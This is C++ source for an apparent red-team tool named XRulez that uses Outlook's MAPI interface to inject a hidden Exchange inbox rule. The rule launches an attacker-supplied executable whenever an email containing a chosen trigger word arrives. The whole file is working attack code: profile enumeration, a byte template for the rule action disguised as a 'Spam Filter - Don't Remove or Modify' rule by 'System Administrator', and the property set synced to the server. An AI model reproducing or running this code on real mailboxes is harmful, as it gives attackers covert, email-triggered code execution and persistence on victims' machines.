#include "stdafx.h"
#include <windows.h>
#include <tlhelp32.h>

#include <mapix.h>
#include <mapiutil.h>
#include <mapi.h>
#include <atlbase.h>
#include <vector>
#include "EdkGuid.h"
#include "EdkMdb.h"

#include <IMessage.h>
#include <iostream>
#include <fstream>
#include <string>
#include <iomanip>
#include <algorithm>
#include <sstream>
#include <regex>

#define USES_IID_IMessage

#include <initguid.h>
#include <MAPIGuid.h>
#include <MAPIAux.h>

std::wstring s2ws(const std::string& s);
std::string ListContents();
LONGLONG FileTimeToEpoch(FILETIME ft);

void OpenInbox(LPMDB lpMDB, LPMAPIFOLDER *lpInboxFolder);
void CreateRule(_In_ LPMESSAGE lpMessage, HWND hWnd);
void PrintUsage();
BOOL IsOutlookRunning();

std::string   rule_name = "";
std::string   rule_trigger = "";
std::string   rule_path = "";
std::string   profile = "";

std::regex re("-(l)|-(a)\\s--(profile|name|trigger|payload)\\s(.+)\\s--(profile|name|trigger|payload)\\s(.+)\\s--(profile|name|trigger|payload)\\s(.+)\\s--(profile|name|trigger|payload)\\s(.+)");


int main(int argc, char **argv)
{
	printf(" __   ________         _            \n");
	printf(" \\ \\ / /| ___ \\       | |           \n");
	printf("  \\ * / | |_/ / _   _ | |  ___  ____\n");
	printf("  /   \\ |    / | | | || | / _ \\|_  /\n");
	printf(" / /^\\ \\| |\\ \\ | |_| || ||  __/ / / \n");
	printf(" \\/   \\/\\_| \\_| \\__,_||_| \\___|/___|\n");
	printf(" - Exchange Rule Injector\n\n");

	std::stringstream c;
	std::smatch match;

	for (int i = 1; i < argc; i++) {
		c << argv[i] << ' ';
	}

	std::string s = c.str();


	if (std::regex_search(s, match, re) && match.size() == 11) {
		if (match.str(1) == "l") {
			std::cout << "[XRulez] Running profile lookup\n\n";

			ListContents();
			exit(1);
		}
		else if (match.str(2) == "a") {
			std::cout << "[XRulez] Adding new rule\n\nWith Parameters:\n";

			for (int i = 3; i < match.size(); i += 2) {
				std::cout << match.str(i) << " = " << match.str(i + 1) << std::endl;

				if (match.str(i) == "profile") profile = match.str(i + 1);
				else if (match.str(i) == "name") rule_name = match.str(i + 1);
				else if (match.str(i) == "trigger") rule_trigger = match.str(i + 1);
				else if (match.str(i) == "payload") rule_path = match.str(i + 1);
				else {
					std::cout << "\n[ERROR] Error with arguments, please run according to usage.\n";
					exit(0);
				}
			}

			if (profile.size() > 50 || rule_name.size() > 50 || rule_trigger.size() > 50 || rule_path.size() > 100) {
				std::cout << "\n[ERROR] Error with argument length, please check lengths in usage.\n";
				exit(0);
			}
		}
		else {
			std::cout << "\n[ERROR] Invalid option flag. First parameter should be -[al]\n";
			exit(0);
		}
	}
	else {
		PrintUsage();
		exit(0);
	}

	MAPIINIT_0    mapiInit = { MAPI_INIT_VERSION, NULL };

	LPMAPISESSION m_lpMAPISession = NULL;
	LPMAPITABLE   m_lpContentsTable = NULL;
	LPMAPIFOLDER  lpInboxFolder = NULL;
	LPSPropValue  tmp = NULL;
	LPSRowSet     pRow = NULL;
	LPMESSAGE     lpNewMessage = NULL;
	LPCWSTR       lpszPath = NULL;
	LPMDB         lpMDB = NULL;

	HRESULT       hres = S_OK;

	static        SRestriction sres;
	ULONG         ulFlags = MAPI_EXTENDED | MAPI_ALLOW_OTHERS | MAPI_NEW_SESSION | MAPI_EXPLICIT_PROFILE; // Login flags, always use MAPI_EXTENDED.

	if (!IsOutlookRunning()) {
		printf("\n[ERROR] It looks like Outlook isn't running.\n");
		return 0;
	}
	else {
		printf("\n[Info] It looks like Outlook is running, continuing...\n");
	}

	hres = MAPIInitialize(&mapiInit); // Search for and initiallise the mapi dll. Outlook (MAPI) has to obviously be installed for the tool to work.

	if (hres != S_OK) {
		std::cout << "\n[ERROR] MAPI failed to initialize. \n\nPossible Causes:\n* Outlook isn't installed.\n* You\'re using 64bit XRulez on a 32bit system (or vise versa).\n\nA dialog box has been shown to the user! (Oops)\n\n";
		return 0;
	}

	LPCSTR profileName = profile.c_str();

	// We're looking to share an already open session.
	hres = MAPILogonEx(
		(ULONG_PTR)0,
		(LPTSTR)profileName,
		0,
		ulFlags,
		&m_lpMAPISession
	);

	if (hres != S_OK) {
		std::cout << "\n[ERROR] MAPI failed to find a profile with that name. \n\nPossible Causes:\n* You specified an invalid profile name.\n\n";
		return 0;
	}

	m_lpMAPISession->GetMsgStoresTable(0, &m_lpContentsTable);

	enum { EID, NAME, NUM_COLS };
	static SizedSPropTagArray(NUM_COLS, sptCols) = { NUM_COLS, PR_ENTRYID, PR_DISPLAY_NAME };

	// We're looking for the default recieving folder so that we can open the associated message table.
	HrQueryAllRows(
		m_lpContentsTable,
		(LPSPropTagArray)&sptCols,
		&sres,
		NULL,
		0,
		&pRow);

	hres = m_lpMAPISession->OpenMsgStore(
		NULL,
		pRow->aRow[0].lpProps[EID].Value.bin.cb,//size and...
		(LPENTRYID)pRow->aRow[0].lpProps[EID].Value.bin.lpb,//value of entry to open
		NULL,//Use default interface (IMsgStore) to open store
		MAPI_BEST_ACCESS | MDB_ONLINE,//Flags
		&lpMDB);//Pointer to place the store in

	if (hres != S_OK) {
		std::cout << "\n[ERROR] MAPI failed open the Message Store. \n\nPossible Causes:\n* The profile isn't currently open in Outlook.\n\n";
		return 0;
	}

	OpenInbox(lpMDB, &lpInboxFolder);
	HrGetOneProp(
		lpInboxFolder,
		PR_DISPLAY_NAME,
		&tmp);
	printf("[Info] Opened folder: '%s'\n", tmp->Value.lpszA); //Open the inbox folder.

														 // Create a blank message in the associated message table, we will copy over our custom properties later.
	lpInboxFolder->CreateMessage(
		NULL,
		MAPI_ASSOCIATED,
		&lpNewMessage
	);
	printf("[Info] A new message in the associated message table has been created\n");

	if (lpNewMessage)
	{
		CreateRule(lpNewMessage, 0);

		lpNewMessage->Release();
		lpNewMessage = NULL;
	}

	printf("[Info] Message has been populated with properties and synced with Exchange.\n\n");

	m_lpMAPISession->Release();
	m_lpContentsTable->Release();
	lpInboxFolder->Release();
	lpMDB->Release();

	m_lpMAPISession = NULL;
	m_lpContentsTable = NULL;
	lpInboxFolder = NULL;
	lpMDB = NULL;

	return 1;
}

LONGLONG FileTimeToEpoch(FILETIME ft)
{
	LARGE_INTEGER val, offset;
	val.LowPart = ft.dwLowDateTime;
	val.HighPart = ft.dwHighDateTime;
	offset.QuadPart = 11644473600000 * 10000;
	val.QuadPart -= offset.QuadPart;
	return val.QuadPart / 10000000;
}

std::string ListContents()
{
	WIN32_FIND_DATAA ffd;
	HANDLE hFind = INVALID_HANDLE_VALUE;
	std::vector<std::string> fileNames;
	std::vector<int> fileTimes;

	char appdatapath[MAX_PATH];
	GetEnvironmentVariable("APPDATA", appdatapath, MAX_PATH); // Check %AppData%\Microsoft\Outlook for .xml files. .xml files represent profiles and are updated when the client is closed.
	std::string dirpath(appdatapath);
	dirpath += "\\Microsoft\\Outlook\\*";

	// First entry in directory
	hFind = FindFirstFileA(dirpath.c_str(), &ffd);

	if (hFind == INVALID_HANDLE_VALUE) {
		printf("Cannot open folder in folder %s: error accessing first entry.", dirpath.c_str());
		return "Error";
	}

	// List files in directory
	do {
		CHAR * fileName = ffd.cFileName;
		std::string s = fileName;

		// Ignore . and .. folders, they cause stack overflow
		if (s == ".") continue;
		if (strcmp(fileName, "..") == 0) continue;
		if (s.substr(s.length() - 4) != ".xml") continue;
		if (ffd.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY) continue; // Is directory?

		FILETIME ftFileLastAccess = ffd.ftLastWriteTime;
		fileName[strlen(fileName) - 4] = '\0';

		fileNames.push_back(fileName);
		fileTimes.push_back(FileTimeToEpoch(ftFileLastAccess));

		//printf("%s Last Accessed: %lli\n", fileName, FileTime_to_POSIX(ftFileLastAccess));

	} while (FindNextFileA(hFind, &ffd));

	int first = 1;
	std::string suggested;

	while (fileNames.size() != 0) {
		int max = -1;
		int index = -1;
		for (int j = 0; j < fileNames.size(); j++) {
			if (fileTimes[j] > max) {
				max = fileTimes[j];
				index = j;
			}
		}
		if (first == 1) {
			std::cout << fileNames[index] << ", Last Accessed " << ((time(NULL) - fileTimes[index]) / 60) << " minutes ago. (Suggested)" << std::endl;
			first = 0;
			suggested = fileNames[index];
		}
		else {
			std::cout << fileNames[index] << ", Last Accessed " << ((time(NULL) - fileTimes[index]) / 60) << " minutes ago." << std::endl;
		}

		fileNames.erase(fileNames.begin() + index);
		fileTimes.erase(fileTimes.begin() + index);
	}

	return suggested;
}

void PrintUsage() {
	std::cout << "XRulez Usage:\n\nDisplay MAPI Profiles:\n-l\n\nCreate a new Exchange rule.\n-a [--profile PROFILE] [--name NAME] [--trigger TRIGGER] [--payload PAYLOAD]\n";
}

std::wstring s2ws(const std::string& s) //Converts a string to a wide string.
{
	int len;
	int slength = (int)s.length() + 1;
	len = MultiByteToWideChar(CP_ACP, 0, s.c_str(), slength, 0, 0);
	wchar_t* buf = new wchar_t[len];
	MultiByteToWideChar(CP_ACP, 0, s.c_str(), slength, buf, len);
	std::wstring r(buf);
	delete[] buf;
	return r;
}

void OpenInbox(
	LPMDB lpMDB,
	LPMAPIFOLDER *lpInboxFolder)
{
	ULONG        cbInbox;
	LPENTRYID    lpbInbox;
	ULONG        ulObjType;
	HRESULT      hRes = S_OK;
	LPMAPIFOLDER	lpTempFolder = NULL;

	*lpInboxFolder = NULL;

	//The Inbox is usually the default receive folder for the message store
	//You call this function as a shortcut to get it's Entry ID
	hRes = lpMDB->GetReceiveFolder(
		NULL,      //Get default receive folder
		NULL,      //Flags
		&cbInbox,  //Size and ...
		&lpbInbox, //Value of the EntryID to be returned
		NULL);     //You don't care to see the class returned

	if (FAILED(hRes)) {
		std::cout << "\n[ERROR] MAPI failed to share the session. \n\nPossible Causes:\n* You specified an invalid profile name.\n* Outlook isn't currently running.\n* The profile you selected isn't currently being used by Outook.\n\n";
		goto quit;
	}

	hRes = lpMDB->OpenEntry(
		cbInbox,                      //Size and...
		lpbInbox,                     //Value of the Inbox's EntryID
		NULL,                         //We want the default interface    (IMAPIFolder)
		MAPI_BEST_ACCESS,             //Flags
		&ulObjType,                   //Object returned type
		(LPUNKNOWN *)&lpTempFolder); //Returned folder

	if (FAILED(hRes)) {
		std::cout << "\n[ERROR] MAPI failed to share the session. \n\nPossible Causes:\n* You specified an invalid profile name.\n* Outlook isn't currently running.\n* The profile you selected isn't currently being used by Outook.\n\n";
		goto quit;
	}

	//Assign the out parameter
	*lpInboxFolder = lpTempFolder;

	//Always clean up your memory here!
quit:
	MAPIFreeBuffer(lpbInbox);
}

void CreateRule(_In_ LPMESSAGE lpMessage, HWND hWnd)
{
	HRESULT				hRes = S_OK;

	int name_offset = 32; // Offsets in the rule actions property. We overwrite the parts that we wish to change.
	int trigger_offset = 225;
	int condition_offset = 15;
	int path_offset = 340;

	int name_length = 50;
	int trigger_length = 50;
	int path_length = 100;

	// Template PR_RULE_MSG_ACTIONS
	BYTE data_12[560] = { 0x00, 0x00, 0x01, 0x00, 0x00, 0x00, 0x01, 0x00, 0x00, 0x00, 0x22, 0x02, 0x00, 0x00, 0x05, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x15, 0x02, 0x00, 0x00, 0x40, 0x42, 0x0F, 0x00, 0x32, 0x53, 0x00, 0x70, 0x00, 0x61, 0x00, 0x6D, 0x00, 0x20, 0x00, 0x46, 0x00, 0x69, 0x00, 0x6C, 0x00, 0x74, 0x00, 0x65, 0x00, 0x72, 0x00, 0x20, 0x00, 0x2D, 0x00, 0x20, 0x00, 0x44, 0x00, 0x6F, 0x00, 0x6E, 0x00, 0x27, 0x00, 0x74, 0x00, 0x20, 0x00, 0x52, 0x00, 0x65, 0x00, 0x6D, 0x00, 0x6F, 0x00, 0x76, 0x00, 0x65, 0x00, 0x20, 0x00, 0x6F, 0x00, 0x72, 0x00, 0x20, 0x00, 0x4D, 0x00, 0x6F, 0x00, 0x64, 0x00, 0x69, 0x00, 0x66, 0x00, 0x79, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x01, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x01, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x02, 0x00, 0x00, 0x00, 0x94, 0x01, 0x00, 0x00, 0x06, 0x00, 0xFF, 0xFF, 0x00, 0x00, 0x0C, 0x00, 0x43, 0x52, 0x75, 0x6C, 0x65, 0x45, 0x6C, 0x65, 0x6D, 0x65, 0x6E, 0x74, 0x90, 0x01, 0x00, 0x00, 0x01, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x01, 0x00, 0x00, 0x00, 0x01, 0x80, 0x64, 0x00, 0x00, 0x00, 0x01, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x01, 0x00, 0x00, 0x00, 0x01, 0x80, 0xCD, 0x00, 0x00, 0x00, 0x01, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x32, 0x45, 0x00, 0x47, 0x00, 0x47, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x01, 0x80, 0x49, 0x01, 0x00, 0x00, 0x01, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x64, 0x43, 0x00, 0x3A, 0x00, 0x5C, 0x00, 0x78, 0x00, 0x72, 0x00, 0x75, 0x00, 0x6C, 0x00, 0x65, 0x00, 0x7A, 0x00, 0x5C, 0x00, 0x70, 0x00, 0x61, 0x00, 0x79, 0x00, 0x6C, 0x00, 0x6F, 0x00, 0x61, 0x00, 0x64, 0x00, 0x2E, 0x00, 0x65, 0x00, 0x78, 0x00, 0x65, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x01, 0x80, 0x4A, 0x01, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x01, 0x80, 0x42, 0x01, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00 };

	for (int i = 0; i < rule_name.size(); i++) {
		data_12[name_offset + i * 2] = rule_name[i];
	}

	for (int i = rule_name.size(); i < name_length; i++) {
		data_12[name_offset + i * 2] = '\0';
	}

	for (int i = 0; i < rule_trigger.size(); i++) {
		data_12[trigger_offset + i * 2] = rule_trigger[i];
	}

	for (int i = rule_trigger.size(); i < trigger_length; i++) {
		data_12[trigger_offset + i * 2] = '\0';
	}

	for (int i = 0; i < rule_path.size(); i++) {
		data_12[path_offset + i * 2] = rule_path[i];
	}

	for (int i = rule_path.size(); i < path_length; i++) {
		data_12[path_offset + i * 2] = '\0';
	}

	BYTE data_13[117] = { 0x00, 0x00, 0x03, 0x01, 0x00, 0x01, 0x00, 0x1F, 0x00, 0x37, 0x00, 0x1F, 0x00, 0x37, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00 };

	for (int i = 0; i < rule_trigger.size(); i++) {
		data_13[condition_offset + i * 2] = rule_trigger[i];
	}

	for (int i = rule_trigger.size(); i < trigger_length; i++) {
		data_13[condition_offset + i * 2] = '\0';
	}

	if (lpMessage)
	{
		ULONG lpcValues = 58;
		SPropValue lppPropArray[58];

		// We create our own properties for everything else.

		// These are the names / hex for all the properties we need.
		lppPropArray[0].ulPropTag = PR_ACCESS;
		lppPropArray[1].ulPropTag = PR_ACCESS_LEVEL;
		lppPropArray[2].ulPropTag = PR_CHANGE_KEY;
		lppPropArray[3].ulPropTag = PR_CLIENT_SUBMIT_TIME;
		lppPropArray[4].ulPropTag = PR_CONVERSATION_INDEX;
		lppPropArray[5].ulPropTag = PR_CREATION_TIME;
		lppPropArray[6].ulPropTag = PR_CREATOR_ENTRYID;
		lppPropArray[7].ulPropTag = PR_CREATOR_NAME;
		lppPropArray[8].ulPropTag = PR_CREATOR_SID;
		lppPropArray[9].ulPropTag = PR_DISPLAY_BCC;
		lppPropArray[10].ulPropTag = PR_DISPLAY_CC;
		lppPropArray[11].ulPropTag = PR_DISPLAY_TO;
		lppPropArray[12].ulPropTag = PR_EXTENDED_RULE_ACTIONS;
		lppPropArray[13].ulPropTag = PR_EXTENDED_RULE_CONDITION;
		lppPropArray[14].ulPropTag = PR_IMPORTANCE;
		lppPropArray[15].ulPropTag = 0x0E230003;
		lppPropArray[16].ulPropTag = 0x1035001E;
		lppPropArray[17].ulPropTag = PR_LAST_MODIFICATION_TIME;
		lppPropArray[18].ulPropTag = PR_LAST_MODIFIER_ENTRYID;
		lppPropArray[19].ulPropTag = PR_LAST_MODIFIER_NAME;
		lppPropArray[20].ulPropTag = PR_LAST_MODIFIER_SID;
		lppPropArray[21].ulPropTag = PR_MESSAGE_CLASS;
		lppPropArray[22].ulPropTag = PR_MESSAGE_CODEPAGE;
		lppPropArray[23].ulPropTag = PR_MESSAGE_DELIVERY_TIME;
		lppPropArray[24].ulPropTag = PR_MESSAGE_FLAGS;
		lppPropArray[25].ulPropTag = PR_MESSAGE_LOCALE_ID;
		lppPropArray[26].ulPropTag = PR_MSG_STATUS;
		lppPropArray[27].ulPropTag = PR_NON_RECEIPT_NOTIFICATION_REQUESTED;
		lppPropArray[28].ulPropTag = PR_PARENT_DISPLAY;
		lppPropArray[29].ulPropTag = PR_PARENT_SOURCE_KEY;
		lppPropArray[30].ulPropTag = PR_PREDECESSOR_CHANGE_LIST;
		lppPropArray[31].ulPropTag = PR_PRIORITY;
		lppPropArray[32].ulPropTag = PR_READ_RECEIPT_REQUESTED;
		lppPropArray[33].ulPropTag = PR_RTF_IN_SYNC;
		lppPropArray[34].ulPropTag = 0x65ED0003;
		lppPropArray[35].ulPropTag = 0x65EC001E;
		lppPropArray[36].ulPropTag = 0x65EB001E;
		lppPropArray[37].ulPropTag = 0x65EE0102;
		lppPropArray[38].ulPropTag = 0x65F30003;
		lppPropArray[39].ulPropTag = 0x65E90003;
		lppPropArray[40].ulPropTag = 0x65EA0003;
		lppPropArray[41].ulPropTag = PR_SEARCH_KEY;
		lppPropArray[42].ulPropTag = PR_SENSITIVITY;
		lppPropArray[43].ulPropTag = PR_SOURCE_KEY;
		lppPropArray[44].ulPropTag = 0x405A0003;
		lppPropArray[45].ulPropTag = 0x40590003;
		lppPropArray[46].ulPropTag = 0x4039001E;
		lppPropArray[47].ulPropTag = 0x4038001E;
		lppPropArray[48].ulPropTag = 0x4025001E;
		lppPropArray[49].ulPropTag = 0x4024001E;
		lppPropArray[50].ulPropTag = 0x4023001E;
		lppPropArray[51].ulPropTag = 0x4022001E;
		lppPropArray[52].ulPropTag = 0x12060003;
		lppPropArray[53].ulPropTag = 0x0ECD000B;
		lppPropArray[54].ulPropTag = 0x0E4C0102;
		lppPropArray[55].ulPropTag = 0x0E4B0102;
		lppPropArray[56].ulPropTag = 0x0E2F0003;
		lppPropArray[57].ulPropTag = 0x62000003;

		// ...and here is the data.
		lppPropArray[0].Value.l = 3;
		lppPropArray[1].Value.l = 1;

		BYTE data_2[22] = { 0x9D, 0x83, 0x80, 0xE2, 0x03, 0x76, 0x4F, 0x46, 0xA1, 0xA2, 0xF5, 0x4F, 0xED, 0xFD, 0xFC, 0xE0, 0x00, 0x00, 0x00, 0xAD, 0x0A, 0x3C };
		lppPropArray[2].Value.bin.cb = 22;
		lppPropArray[2].Value.bin.lpb = data_2;

		lppPropArray[3].Value.ft.dwHighDateTime = 0x01D1F7A4;
		lppPropArray[3].Value.ft.dwLowDateTime = 0x08FFBD46;

		BYTE data_4[22] = { 0x01, 0xD1, 0xF7, 0xA4, 0x08, 0xFF, 0xC4, 0xD5, 0x38, 0xD8, 0x28, 0xCE, 0x23, 0x4C, 0x94, 0x7B, 0x35, 0xB8, 0xFF, 0x4E, 0xF4, 0xAE };
		lppPropArray[4].Value.bin.cb = 22;
		lppPropArray[4].Value.bin.lpb = data_4;

		lppPropArray[5].Value.ft.dwHighDateTime = 0x01D1F7A4;
		lppPropArray[5].Value.ft.dwLowDateTime = 0x8B217D20;

		BYTE data_6[1] = { 0x00 };
		lppPropArray[6].Value.bin.cb = 1;
		lppPropArray[6].Value.bin.lpb = data_6;

		lppPropArray[7].Value.lpszA = "System Administrator";

		BYTE data_8[1] = { 0x00 };
		lppPropArray[8].Value.bin.cb = 1;
		lppPropArray[8].Value.bin.lpb = data_8;

		lppPropArray[9].Value.lpszA = "";
		lppPropArray[10].Value.lpszA = "";
		lppPropArray[11].Value.lpszA = "";

		lppPropArray[12].Value.bin.cb = 560;
		lppPropArray[12].Value.bin.lpb = data_12;

		lppPropArray[13].Value.bin.cb = 117;
		lppPropArray[13].Value.bin.lpb = data_13;

		lppPropArray[14].Value.l = 1;
		lppPropArray[15].Value.l = 49;

		lppPropArray[16].Value.lpszA = "";

		lppPropArray[17].Value.ft.dwHighDateTime = 0x01D1F7A4;
		lppPropArray[17].Value.ft.dwLowDateTime = 0x8B217D20;

		BYTE data_19[1] = { 0x00 };
		lppPropArray[18].Value.bin.cb = 1;
		lppPropArray[18].Value.bin.lpb = data_19;

		lppPropArray[19].Value.lpszA = "System Administrator";

		BYTE data_21[1] = { 0x00 }; 
		lppPropArray[20].Value.bin.cb = 1;
		lppPropArray[20].Value.bin.lpb = data_21;

		lppPropArray[21].Value.lpszA = "IPM.Rule.Version2.Message";

		lppPropArray[22].Value.l = 1252;

		lppPropArray[23].Value.ft.dwHighDateTime = 0x01D1F7A4;
		lppPropArray[23].Value.ft.dwLowDateTime = 0x08FFBD46;

		lppPropArray[24].Value.l = 1097;
		lppPropArray[25].Value.l = 1033;
		lppPropArray[26].Value.l = 0;

		lppPropArray[27].Value.b = FALSE;

		lppPropArray[28].Value.lpszA = "Inbox";

		BYTE data_31[22] = { 0x9D, 0x83, 0x80, 0xE2, 0x03, 0x76, 0x4F, 0x46, 0xA1, 0xA2, 0xF5, 0x4F, 0xED, 0xFD, 0xFC, 0xE0, 0x00, 0x00, 0x00, 0x00, 0x00, 0x0E };
		lppPropArray[29].Value.bin.cb = 22;
		lppPropArray[29].Value.bin.lpb = data_31;

		BYTE data_32[23] = { 0x16, 0x9D, 0x83, 0x80, 0xE2, 0x03, 0x76, 0x4F, 0x46, 0xA1, 0xA2, 0xF5, 0x4F, 0xED, 0xFD, 0xFC, 0xE0, 0x00, 0x00, 0x00, 0xAD, 0x0A, 0x3C };
		lppPropArray[30].Value.bin.cb = 23;
		lppPropArray[30].Value.bin.lpb = data_32;

		lppPropArray[31].Value.l = 0;

		lppPropArray[32].Value.b = FALSE;
		lppPropArray[33].Value.b = FALSE;

		lppPropArray[34].Value.l = 0;

		lppPropArray[35].Value.lpszA = "Internal";
		lppPropArray[36].Value.lpszA = "RuleOrganizer2";

		BYTE data_39[16] = { 0x40, 0x42, 0x0F, 0x00, 0x02, 0x00, 0x00, 0x00, 0x83, 0x2D, 0xD8, 0x82, 0xCE, 0xCC, 0xE4, 0x40 };
		lppPropArray[37].Value.bin.cb = 16;
		lppPropArray[37].Value.bin.lpb = data_39;

		lppPropArray[38].Value.l = 10;
		lppPropArray[39].Value.l = 17;
		lppPropArray[40].Value.l = 0;

		BYTE data_43[16] = { 0x7B, 0x65, 0x41, 0x3D, 0xAE, 0x6F, 0x5A, 0x4F, 0x9F, 0xF5, 0x13, 0xF4, 0xA2, 0xBF, 0xD6, 0x80 };
		lppPropArray[41].Value.bin.cb = 16;
		lppPropArray[41].Value.bin.lpb = data_43;

		lppPropArray[42].Value.l = 0;

		BYTE data_45[22] = { 0x9D, 0x83, 0x80, 0xE2, 0x03, 0x76, 0x4F, 0x46, 0xA1, 0xA2, 0xF5, 0x4F, 0xED, 0xFD, 0xFC, 0xE0, 0x00, 0x00, 0x00, 0xAD, 0xF6, 0x7B };
		lppPropArray[43].Value.bin.cb = 22;
		lppPropArray[43].Value.bin.lpb = data_45;

		lppPropArray[44].Value.l = 0;
		lppPropArray[45].Value.l = 1661;

		lppPropArray[46].Value.lpszA = "";
		lppPropArray[47].Value.lpszA = "";
		lppPropArray[48].Value.lpszA = "";
		lppPropArray[49].Value.lpszA = "EX";
		lppPropArray[50].Value.lpszA = "";
		lppPropArray[51].Value.lpszA = "EX";

		lppPropArray[52].Value.l = 0;

		lppPropArray[53].Value.b = FALSE;

		BYTE data_54[16] = { 0x52, 0xF4, 0x2F, 0x32, 0x70, 0x28, 0x36, 0x40, 0x88, 0x18, 0x55, 0x82, 0x05, 0x93, 0x68, 0xA7 };
		lppPropArray[54].Value.bin.cb = 16;
		lppPropArray[54].Value.bin.lpb = data_54;

		BYTE data_55[16] = { 0x52, 0xF4, 0x2F, 0x32, 0x70, 0x28, 0x36, 0x40, 0x88, 0x18, 0x55, 0x82, 0x05, 0x93, 0x68, 0xA7 };
		lppPropArray[55].Value.bin.cb = 16;
		lppPropArray[55].Value.bin.lpb = data_55;

		lppPropArray[56].Value.l = 49;
		lppPropArray[57].Value.l = 1492450544;

		// Set the properties of the blank message to the ones we just created.
		lpMessage->SetProps(
			lpcValues,
			lppPropArray,
			NULL
		);

		// Save the message to the Exchange server. 
		lpMessage->SaveChanges(KEEP_OPEN_READWRITE);
	}


} // CreateRule

BOOL IsOutlookRunning()
{
	HANDLE hProcessSnap;
	HANDLE hProcess;
	PROCESSENTRY32 pe32;
	DWORD dwPriorityClass;

	// Take a snapshot of all processes in the system.
	hProcessSnap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);


	// Set the size of the structure before using it.
	pe32.dwSize = sizeof(PROCESSENTRY32);


	// Now walk the snapshot of processes, and
	// display information about each process in turn
	do
	{
		std::string processName = pe32.szExeFile;
		std::transform(processName.begin(), processName.end(), processName.begin(), ::tolower);

		if (processName.find("outlook") != std::string::npos) {
			return true;
		}

	} while (Process32Next(hProcessSnap, &pe32));

	CloseHandle(hProcessSnap);
	return false;
}